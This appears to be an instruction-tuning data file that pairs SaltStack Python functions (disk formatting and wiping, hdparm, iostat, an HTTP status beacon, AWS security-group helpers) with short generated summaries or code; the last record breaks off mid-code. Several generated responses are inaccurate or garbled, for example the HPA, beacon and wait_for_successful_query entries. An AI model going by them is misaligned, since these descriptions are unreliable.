{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef tune(device, **kwargs):\n    '''\n    Set attributes for the specified device\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.tune /dev/sda1 read-ahead=1024 read-write=True\n\n    Valid options are: ``read-ahead``, ``filesystem-read-ahead``,\n    ``read-only``, ``read-write``.\n\n    See the ``blockdev(8)`` manpage for a more complete description of these\n    options.\n    '''\n\n    kwarg_map = {'read-ahead': 'setra',\n                 'filesystem-read-ahead': 'setfra',\n                 'read-only': 'setro',\n                 'read-write': 'setrw'}\n    opts = ''\n    args = []\n    for key in kwargs:\n        if key in kwarg_map:\n            switch = kwarg_map[key]\n            if key != 'read-write':\n                args.append(switch.replace('set', 'get'))\n            else:\n                args.append('getro')\n            if kwargs[key] == 'True' or kwargs[key] is True:\n                opts += '--{0} '.format(key)\n            else:\n                opts += '--{0} {1} '.format(switch, kwargs[key])\n    cmd = 'blockdev {0}{1}'.format(opts, device)\n    out = __salt__['cmd.run'](cmd, python_shell=False).splitlines()\n    return dump(device, args)", "response": "Tune the specified device"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef wipe(device):\n    '''\n    Remove the filesystem information\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.wipe /dev/sda1\n    '''\n\n    cmd = 'wipefs -a {0}'.format(device)\n    try:\n        out = __salt__['cmd.run_all'](cmd, python_shell=False)\n    except subprocess.CalledProcessError as err:\n        return False\n    if out['retcode'] == 0:\n        return True\n    else:\n        log.error('Error wiping device %s: %s', device, out['stderr'])\n        return False", "response": "Remove the filesystem information of a specific device"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn all contents of dumpe2fs for a specified device", "response": "def dump(device, args=None):\n    '''\n    Return all contents of dumpe2fs for a specified device\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' disk.dump /dev/sda1\n    '''\n    cmd = 'blockdev --getro --getsz --getss --getpbsz --getiomin --getioopt --getalignoff ' \\\n          '--getmaxsect --getsize --getsize64 --getra --getfra {0}'.format(device)\n    ret = {}\n    opts = [c[2:] for c in cmd.split() if c.startswith('--')]\n    out = __salt__['cmd.run_all'](cmd, python_shell=False)\n    if out['retcode'] == 0:\n        lines = [line for line in out['stdout'].splitlines() if line]\n        count = 0\n        for line in lines:\n            ret[opts[count]] = line\n            count = count+1\n        if args:\n            temp_ret = {}\n            for arg in args:\n                temp_ret[arg] = ret[arg]\n            return temp_ret\n        else:\n            return ret\n    else:\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef format_(device,\n            fs_type='ext4',\n            inode_size=None,\n            lazy_itable_init=None,\n            fat=None,\n            force=False):\n    '''\n    Format a filesystem onto a device\n\n    .. versionadded:: 2016.11.0\n\n    device\n        The device in which to create the new filesystem\n\n    fs_type\n        The type of filesystem to create\n\n    inode_size\n        Size of the inodes\n\n        This option is only enabled for ext and xfs filesystems\n\n    lazy_itable_init\n        If enabled and the uninit_bg feature is enabled, the inode table will\n        not be fully initialized by mke2fs.  This speeds up filesystem\n        initialization noticeably, but it requires the kernel to finish\n        initializing the filesystem  in  the  background  when  the filesystem\n        is first mounted.  If the option value is omitted, it defaults to 1 to\n        enable lazy inode table zeroing.\n\n        This option is only enabled for ext filesystems\n\n    fat\n        FAT size option. Can be 12, 16 or 32, and can only be used on\n        fat or vfat filesystems.\n\n    force\n        Force mke2fs to create a filesystem, even if the specified device is\n        not a partition on a block special device. This option is only enabled\n        for ext and xfs filesystems\n\n        This option is dangerous, use it with caution.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.format /dev/sdX1\n    '''\n    cmd = ['mkfs', '-t', six.text_type(fs_type)]\n    if inode_size is not None:\n        if fs_type[:3] == 'ext':\n            cmd.extend(['-i', six.text_type(inode_size)])\n        elif fs_type == 'xfs':\n            cmd.extend(['-i', 'size={0}'.format(inode_size)])\n    if lazy_itable_init is not None:\n        if fs_type[:3] == 'ext':\n            cmd.extend(['-E', 'lazy_itable_init={0}'.format(lazy_itable_init)])\n    if fat is not None and fat in (12, 16, 32):\n        if fs_type[-3:] == 'fat':\n            cmd.extend(['-F', fat])\n    if force:\n        if fs_type[:3] == 'ext':\n            cmd.append('-F')\n        elif fs_type == 'xfs':\n            cmd.append('-f')\n    cmd.append(six.text_type(device))\n\n    mkfs_success = __salt__['cmd.retcode'](cmd, ignore_retcode=True) == 0\n    sync_success = __salt__['cmd.retcode']('sync', ignore_retcode=True) == 0\n\n    return all([mkfs_success, sync_success])", "response": "This function formats a filesystem onto a device."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the filesystem name of the specified device", "response": "def fstype(device):\n    '''\n    Return the filesystem name of the specified device\n\n    .. versionadded:: 2016.11.0\n\n    device\n        The name of the device\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.fstype /dev/sdX1\n    '''\n    if salt.utils.path.which('lsblk'):\n        lsblk_out = __salt__['cmd.run']('lsblk -o fstype {0}'.format(device)).splitlines()\n        if len(lsblk_out) > 1:\n            fs_type = lsblk_out[1].strip()\n            if fs_type:\n                return fs_type\n\n    if salt.utils.path.which('df'):\n        # the fstype was not set on the block device, so inspect the filesystem\n        # itself for its type\n        if __grains__['kernel'] == 'AIX' and os.path.isfile('/usr/sysv/bin/df'):\n            df_out = __salt__['cmd.run']('/usr/sysv/bin/df -n {0}'.format(device)).split()\n            if len(df_out) > 2:\n                fs_type = df_out[2]\n                if fs_type:\n                    return fs_type\n        else:\n            df_out = __salt__['cmd.run']('df -T {0}'.format(device)).splitlines()\n            if len(df_out) > 1:\n                fs_type = df_out[1]\n                if fs_type:\n                    return fs_type\n\n    return ''"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nexecutes hdparm fail hard when required return output when possible", "response": "def _hdparm(args, failhard=True):\n    '''\n    Execute hdparm\n    Fail hard when required\n    return output when possible\n    '''\n    cmd = 'hdparm {0}'.format(args)\n    result = __salt__['cmd.run_all'](cmd)\n    if result['retcode'] != 0:\n        msg = '{0}: {1}'.format(cmd, result['stderr'])\n        if failhard:\n            raise CommandExecutionError(msg)\n        else:\n            log.warning(msg)\n\n    return result['stdout']"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef hdparms(disks, args=None):\n    '''\n    Retrieve all info's for all disks\n    parse 'em into a nice dict\n    (which, considering hdparms output, is quite a hassle)\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n    .. code-block:: bash\n\n        salt '*' disk.hdparms /dev/sda\n    '''\n    all_parms = 'aAbBcCdgHiJkMmNnQrRuW'\n    if args is None:\n        args = all_parms\n    elif isinstance(args, (list, tuple)):\n        args = ''.join(args)\n\n    if not isinstance(disks, (list, tuple)):\n        disks = [disks]\n\n    out = {}\n    for disk in disks:\n        if not disk.startswith('/dev'):\n            disk = '/dev/{0}'.format(disk)\n        disk_data = {}\n        for line in _hdparm('-{0} {1}'.format(args, disk), False).splitlines():\n            line = line.strip()\n            if not line or line == disk + ':':\n                continue\n\n            if ':' in line:\n                key, vals = line.split(':', 1)\n                key = re.sub(r' is$', '', key)\n            elif '=' in line:\n                key, vals = line.split('=', 1)\n            else:\n                continue\n            key = key.strip().lower().replace(' ', '_')\n            vals = vals.strip()\n\n            rvals = []\n            if re.match(r'[0-9]+ \\(.*\\)', vals):\n                vals = vals.split(' ')\n                rvals.append(int(vals[0]))\n                rvals.append(vals[1].strip('()'))\n            else:\n                valdict = {}\n                for val in re.split(r'[/,]', vals.strip()):\n                    val = val.strip()\n                    try:\n                        val = int(val)\n                        rvals.append(val)\n                    except Exception:\n                        if '=' in val:\n                            deep_key, val = val.split('=', 1)\n                            deep_key = deep_key.strip()\n                            val = val.strip()\n                            if val:\n                                valdict[deep_key] = val\n                        elif val:\n                            rvals.append(val)\n                if valdict:\n                    rvals.append(valdict)\n                if not rvals:\n                    continue\n                elif len(rvals) == 1:\n                    rvals = rvals[0]\n            disk_data[key] = rvals\n\n        out[disk] = disk_data\n\n    return out", "response": "Retrieve all info s for all disks and return a nice dict containing the info s for all disks."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a HPA file for the given set of disks.", "response": "def hpa(disks, size=None):\n    '''\n    Get/set Host Protected Area settings\n\n    T13 INCITS 346-2001 (1367D) defines the BEER (Boot Engineering Extension Record)\n    and PARTIES (Protected Area Run Time Interface Extension Services), allowing\n    for a Host Protected Area on a disk.\n\n    It's often used by OEMS to hide parts of a disk, and for overprovisioning SSD's\n\n    .. warning::\n        Setting the HPA might clobber your data, be very careful with this on active disks!\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.hpa /dev/sda\n        salt '*' disk.hpa /dev/sda 5%\n        salt '*' disk.hpa /dev/sda 10543256\n    '''\n\n    hpa_data = {}\n    for disk, data in hdparms(disks, 'N').items():\n        visible, total, status = data.values()[0]\n        if visible == total or 'disabled' in status:\n            hpa_data[disk] = {\n                'total': total\n            }\n        else:\n            hpa_data[disk] = {\n                'total': total,\n                'visible': visible,\n                'hidden': total - visible\n            }\n\n    if size is None:\n        return hpa_data\n\n    for disk, data in hpa_data.items():\n        try:\n            size = data['total'] - int(size)\n        except Exception:\n            if '%' in size:\n                size = int(size.strip('%'))\n                size = (100 - size) * data['total']\n                size /= 100\n        if size <= 0:\n            size = data['total']\n\n        _hdparm('--yes-i-know-what-i-am-doing -Np{0} {1}'.format(size, disk))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef smart_attributes(dev, attributes=None, values=None):\n    '''\n    Fetch SMART attributes\n    Providing attributes will deliver only requested attributes\n    Providing values will deliver only requested values for attributes\n\n    Default is the Backblaze recommended\n    set (https://www.backblaze.com/blog/hard-drive-smart-stats/):\n    (5,187,188,197,198)\n\n    .. versionadded:: 2016.3.0\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.smart_attributes /dev/sda\n        salt '*' disk.smart_attributes /dev/sda attributes=(5,187,188,197,198)\n    '''\n\n    if not dev.startswith('/dev/'):\n        dev = '/dev/' + dev\n\n    cmd = 'smartctl --attributes {0}'.format(dev)\n    smart_result = __salt__['cmd.run_all'](cmd, output_loglevel='quiet')\n    if smart_result['retcode'] != 0:\n        raise CommandExecutionError(smart_result['stderr'])\n\n    smart_result = iter(smart_result['stdout'].splitlines())\n\n    fields = []\n    for line in smart_result:\n        if line.startswith('ID#'):\n            fields = re.split(r'\\s+', line.strip())\n            fields = [key.lower() for key in fields[1:]]\n            break\n\n    if values is not None:\n        fields = [field if field in values else '_' for field in fields]\n\n    smart_attr = {}\n    for line in smart_result:\n        if not re.match(r'[\\s]*\\d', line):\n            break\n\n        line = re.split(r'\\s+', line.strip(), maxsplit=len(fields))\n        attr = int(line[0])\n\n        if attributes is not None and attr not in attributes:\n            continue\n\n        data = dict(zip(fields, line[1:]))\n        try:\n            del data['_']\n        except Exception:\n            pass\n\n        for field in data:\n            val = data[field]\n            try:\n                val = int(val)\n            except Exception:\n                try:\n                    val = [int(value) for value in val.split(' ')]\n                except Exception:\n                    pass\n            data[field] = val\n\n        smart_attr[attr] = data\n\n    return smart_attr", "response": "Fetches SMART attributes for a given device"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef iostat(interval=1, count=5, disks=None):\n    '''\n    Gather and return (averaged) IO stats.\n\n    .. versionadded:: 2016.3.0\n\n    .. versionchanged:: 2016.11.4\n        Added support for AIX\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' disk.iostat 1 5 disks=sda\n    '''\n    if salt.utils.platform.is_linux():\n        return _iostat_linux(interval, count, disks)\n    elif salt.utils.platform.is_freebsd():\n        return _iostat_fbsd(interval, count, disks)\n    elif salt.utils.platform.is_aix():\n        return _iostat_aix(interval, count, disks)", "response": "Gather and return IO stats."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts stats to dict", "response": "def _iostats_dict(header, stats):\n    '''\n    Transpose collected data, average it, stomp it in dict using header\n\n    Use Decimals so we can properly calc & round, convert to float 'caus' we can't transmit Decimals over 0mq\n    '''\n    stats = [float((sum(stat) / len(stat)).quantize(decimal.Decimal('.01'))) for stat in zip(*stats)]\n    stats = dict(zip(header, stats))\n    return stats"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _iostat_fbsd(interval, count, disks):\n    '''\n    Tested on FreeBSD, quite likely other BSD's only need small changes in cmd syntax\n    '''\n    if disks is None:\n        iostat_cmd = 'iostat -xC -w {0} -c {1} '.format(interval, count)\n    elif isinstance(disks, six.string_types):\n        iostat_cmd = 'iostat -x -w {0} -c {1} {2}'.format(interval, count, disks)\n    else:\n        iostat_cmd = 'iostat -x -w {0} -c {1} {2}'.format(interval, count, ' '.join(disks))\n\n    sys_stats = []\n    dev_stats = collections.defaultdict(list)\n    sys_header = []\n    dev_header = []\n    h_len = 1000  # randomly absurdly high\n\n    ret = iter(__salt__['cmd.run_stdout'](iostat_cmd, output_loglevel='quiet').splitlines())\n    for line in ret:\n        if not line.startswith('device'):\n            continue\n        elif not dev_header:\n            dev_header = line.split()[1:]\n        while line is not False:\n            line = next(ret, False)\n            if not line or not line[0].isalnum():\n                break\n            line = line.split()\n            disk = line[0]\n            stats = [decimal.Decimal(x) for x in line[1:]]\n            # h_len will become smallest number of fields in stat lines\n            if len(stats) < h_len:\n                h_len = len(stats)\n            dev_stats[disk].append(stats)\n\n    iostats = {}\n\n    # The header was longer than the smallest number of fields\n    # Therefore the sys stats are hidden in there\n    if h_len < len(dev_header):\n        sys_header = dev_header[h_len:]\n        dev_header = dev_header[0:h_len]\n\n        for disk, stats in dev_stats.items():\n            if len(stats[0]) > h_len:\n                sys_stats = [stat[h_len:] for stat in stats]\n                dev_stats[disk] = [stat[0:h_len] for stat in stats]\n\n        iostats['sys'] = _iostats_dict(sys_header, sys_stats)\n\n    for disk, stats in dev_stats.items():\n        iostats[disk] = _iostats_dict(dev_header, stats)\n\n    return iostats", "response": "Return a list of iostats for the given interval and disks"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _iostat_aix(interval, count, disks):\n    '''\n    AIX support to gather and return (averaged) IO stats.\n    '''\n    log.debug('DGM disk iostat entry')\n\n    if disks is None:\n        iostat_cmd = 'iostat -dD {0} {1} '.format(interval, count)\n    elif isinstance(disks, six.string_types):\n        iostat_cmd = 'iostat -dD {0} {1} {2}'.format(disks, interval, count)\n    else:\n        iostat_cmd = 'iostat -dD {0} {1} {2}'.format(' '.join(disks), interval, count)\n\n    ret = {}\n    procn = None\n    fields = []\n    disk_name = ''\n    disk_mode = ''\n    dev_stats = collections.defaultdict(list)\n    for line in __salt__['cmd.run'](iostat_cmd).splitlines():\n        # Note: iostat -dD is per-system\n        #\n        #root@l490vp031_pub:~/devtest# iostat -dD hdisk6 1 3\n        #\n        #System configuration: lcpu=8 drives=1 paths=2 vdisks=2\n        #\n        #hdisk6          xfer:  %tm_act      bps      tps      bread      bwrtn\n        #                          0.0      0.0      0.0        0.0        0.0\n        #                read:      rps  avgserv  minserv  maxserv   timeouts      fails\n        #                          0.0      0.0      0.0      0.0           0          0\n        #               write:      wps  avgserv  minserv  maxserv   timeouts      fails\n        #                          0.0      0.0      0.0      0.0           0          0\n        #               queue:  avgtime  mintime  maxtime  avgwqsz    avgsqsz     sqfull\n        #                          0.0      0.0      0.0      0.0        0.0         0.0\n        #--------------------------------------------------------------------------------\n        #\n        #hdisk6          xfer:  %tm_act      bps      tps      bread      bwrtn\n        #                          9.6     16.4K     4.0       16.4K       0.0\n        #                read:      rps  avgserv  minserv  maxserv   timeouts      fails\n        #                          4.0      4.9      0.3      9.9           0          0\n        #               write:      wps  avgserv  minserv  maxserv   timeouts      fails\n        #                          0.0      0.0      0.0      0.0           0          0\n        #               queue:  avgtime  mintime  maxtime  avgwqsz    avgsqsz     sqfull\n        #                          0.0      0.0      0.0      0.0        0.0         0.0\n        #--------------------------------------------------------------------------------\n        #\n        #hdisk6          xfer:  %tm_act      bps      tps      bread      bwrtn\n        #                          0.0      0.0      0.0        0.0        0.0\n        #                read:      rps  avgserv  minserv  maxserv   timeouts      fails\n        #                          0.0      0.0      0.3      9.9           0          0\n        #               write:      wps  avgserv  minserv  maxserv   timeouts      fails\n        #                          0.0      0.0      0.0      0.0           0          0\n        #               queue:  avgtime  mintime  maxtime  avgwqsz    avgsqsz     sqfull\n        #                          0.0      0.0      0.0      0.0        0.0         0.0\n        #--------------------------------------------------------------------------------\n        if not line or line.startswith('System') or line.startswith('-----------'):\n            continue\n\n        if not re.match(r'\\s', line):\n            #seen disk name\n            dsk_comps = line.split(':')\n            dsk_firsts = dsk_comps[0].split()\n            disk_name = dsk_firsts[0]\n            disk_mode = dsk_firsts[1]\n            fields = dsk_comps[1].split()\n            if disk_name not in dev_stats.keys():\n                dev_stats[disk_name] = []\n                procn = len(dev_stats[disk_name])\n                dev_stats[disk_name].append({})\n                dev_stats[disk_name][procn][disk_mode] = {}\n                dev_stats[disk_name][procn][disk_mode]['fields'] = fields\n                dev_stats[disk_name][procn][disk_mode]['stats'] = []\n            continue\n\n        if ':' in line:\n            comps = line.split(':')\n            fields = comps[1].split()\n            disk_mode = comps[0].lstrip()\n            if disk_mode not in dev_stats[disk_name][0].keys():\n                dev_stats[disk_name][0][disk_mode] = {}\n                dev_stats[disk_name][0][disk_mode]['fields'] = fields\n                dev_stats[disk_name][0][disk_mode]['stats'] = []\n        else:\n            line = line.split()\n            stats = [_parse_numbers(x) for x in line[:]]\n            dev_stats[disk_name][0][disk_mode]['stats'].append(stats)\n\n    iostats = {}\n\n    for disk, list_modes in dev_stats.items():\n        iostats[disk] = {}\n        for modes in list_modes:\n            for disk_mode in modes.keys():\n                fields = modes[disk_mode]['fields']\n                stats = modes[disk_mode]['stats']\n                iostats[disk][disk_mode] = _iostats_dict(fields, stats)\n\n    return iostats", "response": "Return AIX IO stats for the current iostat entry."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef validate(config):\n    '''\n    Validate the beacon configuration\n    '''\n    valid = True\n    messages = []\n\n    if not isinstance(config, list):\n        valid = False\n        messages.append('[-] Configuration for %s beacon must be a list', config)\n    else:\n        _config = {}\n        list(map(_config.update, config))\n\n    try:\n        sites = _config.get('sites', {})\n    except AttributeError:\n        valid = False\n        messages.append('[-] Sites for %s beacon must be a dict', __virtualname__)\n\n    if not sites:\n        valid = False\n        messages.append('[-] Configuration does not contain sites')\n\n    for site, settings in sites.items():\n        if required_site_attributes.isdisjoint(set(settings.keys())):\n            valid = False\n            messages.append('[-] Sites for {} beacon requires {}'.format(__virtualname__,\n                                                                         required_site_attributes))\n        log.debug('[+] site: %s', site)\n        log.debug('[+] settings: %s', settings)\n\n        for optional_attrs in itertools.chain(settings.get(attr, []) for attr in optional_site_attributes):\n            for item in optional_attrs:\n                cmp = item.get('comp')\n                if cmp and cmp not in comparisons:\n                    valid = False\n                    messages.append('[-] Invalid comparison operator %s', cmp)\n\n    messages.append('[+] Valid beacon configuration')\n    return valid, messages", "response": "Validate the beacon configuration"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef beacon(config):\n    '''\n    Check on different service status reported by the django-server-status\n    library.\n\n    .. code-block:: yaml\n\n        beacons:\n          http_status:\n            - sites:\n                example-site-1:\n                  url: \"https://example.com/status\"\n                  timeout: 30\n                  content-type: json\n                  status:\n                    - value: 400\n                      comp: <\n                    - value: 300\n                      comp: '>='\n                  content:\n                    - path: 'certificate:status'\n                      value: down\n                      comp: '=='\n                    - path: 'status_all'\n                      value: down\n                      comp: '=='\n            - interval: 10\n    '''\n    ret = []\n\n    _config = {}\n    list(map(_config.update, config))\n\n    for site, site_config in _config.get('sites', {}).items():\n        url = site_config.pop('url')\n        content_type = site_config.pop('content_type', 'json')\n        try:\n            r = requests.get(url, timeout=site_config.pop('timeout', 30))\n        except requests.exceptions.RequestException as e:\n            log.info(\"Request failed: %s\", e)\n            if r.raise_for_status:\n                log.info('[-] Response from status endpoint was invalid: '\n                         '%s', r.status_code)\n                _failed = {'status_code': r.status_code,\n                           'url': url}\n                ret.append(_failed)\n                continue\n\n        for attr, checks in site_config.items():\n            for check in checks:\n                log.debug('[+] response_item: %s', attr)\n                attr_path = check.get('path', '')\n                comp = comparisons[check['comp']]\n                expected_value = check['value']\n                if attr_path:\n                    received_value = salt.utils.data.traverse_dict_and_list(attr_func_map[attr](r), attr_path)\n                else:\n                    received_value = attr_func_map[attr](r)\n                if received_value is None:\n                    log.info('[-] No data found at location %s for url %s', attr_path, url)\n                    continue\n                log.debug('[+] expected_value: %s', expected_value)\n                log.debug('[+] received_value: %s', received_value)\n                if not comp(expected_value, received_value):\n                    _failed = {'expected': expected_value,\n                               'received': received_value,\n                               'url': url,\n                               'path': attr_path\n                               }\n                    ret.append(_failed)\n    return ret", "response": "A helper function to be used to be notified of different service status on different service status reported by django - server - status\nador library."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nqueries a resource and decode the return data", "response": "def query(url, **kwargs):\n    '''\n    Query a resource, and decode the return data\n\n    Passes through all the parameters described in the\n    :py:func:`utils.http.query function <salt.utils.http.query>`:\n\n    .. autofunction:: salt.utils.http.query\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' http.query http://somelink.com/\n        salt '*' http.query http://somelink.com/ method=POST \\\n            params='key1=val1&key2=val2'\n        salt '*' http.query http://somelink.com/ method=POST \\\n            data='<xml>somecontent</xml>'\n\n    For more information about the ``http.query`` module, refer to the\n    :ref:`HTTP Tutorial <tutorial-http>`.\n    '''\n    opts = __opts__.copy()\n    if 'opts' in kwargs:\n        opts.update(kwargs['opts'])\n        del kwargs['opts']\n\n    return salt.utils.http.query(url=url, opts=opts, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef wait_for_successful_query(url, wait_for=300, **kwargs):\n    '''\n    Query a resource until a successful response, and decode the return data\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' http.wait_for_successful_query http://somelink.com/ wait_for=160\n    '''\n\n    starttime = time.time()\n\n    while True:\n        caught_exception = None\n        result = None\n        try:\n            result = query(url=url, **kwargs)\n            if not result.get('Error') and not result.get('error'):\n                return result\n        except Exception as exc:\n            caught_exception = exc\n\n        if time.time() > starttime + wait_for:\n            if not result and caught_exception:\n                # workaround pylint bug https://www.logilab.org/ticket/3207\n                raise caught_exception  # pylint: disable=E0702\n\n            return result", "response": "Query a resource until a successful response and decode the return data\nAttributeNames CLI Example : bash\nAttributeNames salt '*' http. wait_for_successful_query http://somelink. com"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update_ca_bundle(target=None, source=None, merge_files=None):\n    '''\n    Update the local CA bundle file from a URL\n\n    .. versionadded:: 2015.5.0\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' http.update_ca_bundle\n        salt '*' http.update_ca_bundle target=/path/to/cacerts.pem\n        salt '*' http.update_ca_bundle source=https://example.com/cacerts.pem\n\n    If the ``target`` is not specified, it will be pulled from the ``ca_cert``\n    configuration variable available to the minion. If it cannot be found there,\n    it will be placed at ``<<FILE_ROOTS>>/cacerts.pem``.\n\n    If the ``source`` is not specified, it will be pulled from the\n    ``ca_cert_url`` configuration variable available to the minion. If it cannot\n    be found, it will be downloaded from the cURL website, using an http (not\n    https) URL. USING THE DEFAULT URL SHOULD BE AVOIDED!\n\n    ``merge_files`` may also be specified, which includes a string or list of\n    strings representing a file or files to be appended to the end of the CA\n    bundle, once it is downloaded.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' http.update_ca_bundle merge_files=/path/to/mycert.pem\n    '''\n    if target is None:\n        target = __salt__['config.get']('ca_bundle', None)\n\n    if source is None:\n        source = __salt__['config.get']('ca_bundle_url', None)\n\n    return salt.utils.http.update_ca_bundle(\n        target, source, __opts__, merge_files\n    )", "response": "Update the local CA bundle file from a URL"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef exists(name=None, region=None, key=None, keyid=None, profile=None,\n           vpc_id=None, vpc_name=None, group_id=None):\n    '''\n    Check to see if a security group exists.\n\n    CLI example::\n\n        salt myminion boto_secgroup.exists mysecgroup\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    group = _get_group(conn, name=name, vpc_id=vpc_id, vpc_name=vpc_name,\n                       group_id=group_id, region=region, key=key, keyid=keyid,\n                       profile=profile)\n    if group:\n        return True\n    else:\n        return False", "response": "Check to see if a security group exists."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _split_rules(rules):\n    '''\n    Split rules with combined grants into individual rules.\n\n    Amazon returns a set of rules with the same protocol, from and to ports\n    together as a single rule with a set of grants. Authorizing and revoking\n    rules, however, is done as a split set of rules. This function splits the\n    rules up.\n    '''\n    split = []\n    for rule in rules:\n        ip_protocol = rule.get('ip_protocol')\n        to_port = rule.get('to_port')\n        from_port = rule.get('from_port')\n        grants = rule.get('grants')\n        for grant in grants:\n            _rule = {'ip_protocol': ip_protocol,\n                     'to_port': to_port,\n                     'from_port': from_port}\n            for key, val in six.iteritems(grant):\n                _rule[key] = val\n            split.append(_rule)\n    return split", "response": "Splits the rules with combined grants into individual rules."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets a security group object given a name and vpc_id or group_id.", "response": "def _get_group(conn=None, name=None, vpc_id=None, vpc_name=None, group_id=None,\n               region=None, key=None, keyid=None, profile=None):  # pylint: disable=W0613\n    '''\n    Get a group object given a name, name and vpc_id/vpc_name or group_id. Return\n    a boto.ec2.securitygroup.SecurityGroup object if the group is found, else\n    return None.\n    '''\n    if vpc_name and vpc_id:\n        raise SaltInvocationError('The params \\'vpc_id\\' and \\'vpc_name\\' '\n                                  'are mutually exclusive.')\n    if vpc_name:\n        try:\n            vpc_id = _vpc_name_to_id(vpc_id=vpc_id, vpc_name=vpc_name, region=region,\n                                key=key, keyid=keyid, profile=profile)\n        except boto.exception.BotoServerError as e:\n            log.debug(e)\n            return None\n    if name:\n        if vpc_id is None:\n            log.debug('getting group for %s', name)\n            group_filter = {'group-name': name}\n            filtered_groups = conn.get_all_security_groups(filters=group_filter)\n            # security groups can have the same name if groups exist in both\n            # EC2-Classic and EC2-VPC\n            # iterate through groups to ensure we return the EC2-Classic\n            # security group\n            for group in filtered_groups:\n                # a group in EC2-Classic will have vpc_id set to None\n                if group.vpc_id is None:\n                    return group\n            # If there are more security groups, and no vpc_id, we can't know which one to choose.\n            if len(filtered_groups) > 1:\n                raise CommandExecutionError('Security group belongs to more VPCs, specify the VPC ID!')\n            elif len(filtered_groups) == 1:\n                return filtered_groups[0]\n            return None\n        elif vpc_id:\n            log.debug('getting group for %s in vpc_id %s', name, vpc_id)\n            group_filter = {'group-name': name, 'vpc_id': vpc_id}\n            filtered_groups = conn.get_all_security_groups(filters=group_filter)\n            if len(filtered_groups) == 1:\n                return filtered_groups[0]\n            else:\n                return None\n        else:\n            return None\n    elif group_id:\n        try:\n            groups = conn.get_all_security_groups(group_ids=[group_id])\n        except boto.exception.BotoServerError as e:\n            log.debug(e)\n            return None\n        if len(groups) == 1:\n            return groups[0]\n        else:\n            return None\n    else:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_all_security_groups(groupnames=None, group_ids=None, filters=None,\n                            region=None, key=None, keyid=None, profile=None):\n    '''\n    Return a list of all Security Groups matching the given criteria and filters.\n\n    Note that the 'groupnames' argument only functions correctly for EC2 Classic\n    and default VPC Security Groups.  To find groups by name in other VPCs you'll\n    want to use the 'group-name' filter instead.\n\n    Valid keys for the filters argument are:\n        description - The description of the security group.\n        egress.ip-permission.prefix-list-id - The ID (prefix) of the AWS service to which the security group allows access.\n        group-id - The ID of the security group.\n        group-name - The name of the security group.\n        ip-permission.cidr - A CIDR range that has been granted permission.\n        ip-permission.from-port - The start of port range for the TCP and UDP protocols, or an ICMP type number.\n        ip-permission.group-id - The ID of a security group that has been granted permission.\n        ip-permission.group-name - The name of a security group that has been granted permission.\n        ip-permission.protocol - The IP protocol for the permission (tcp | udp | icmp or a protocol number).\n        ip-permission.to-port - The end of port range for the TCP and UDP protocols, or an ICMP code.\n        ip-permission.user-id - The ID of an AWS account that has been granted permission.\n        owner-id - The AWS account ID of the owner of the security group.\n        tag-key - The key of a tag assigned to the security group.\n        tag-value - The value of a tag assigned to the security group.\n        vpc-id - The ID of the VPC specified when the security group was created.\n\n    CLI example::\n\n        salt myminion boto_secgroup.get_all_security_groups filters='{group-name: mygroup}'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    if isinstance(groupnames, six.string_types):\n        groupnames = [groupnames]\n    if isinstance(group_ids, six.string_types):\n        groupnames = [group_ids]\n\n    interesting = ['description', 'id', 'instances', 'name', 'owner_id',\n                   'region', 'rules', 'rules_egress', 'tags', 'vpc_id']\n    ret = []\n    try:\n        r = conn.get_all_security_groups(groupnames=groupnames,\n                                         group_ids=group_ids,\n                                         filters=filters)\n        for g in r:\n            n = {}\n            for a in interesting:\n                v = getattr(g, a, None)\n                if a == 'region':\n                    v = v.name\n                elif a in ('rules', 'rules_egress'):\n                    v = _parse_rules(g, v)\n                elif a == 'instances':\n                    v = [i.id for i in v()]\n                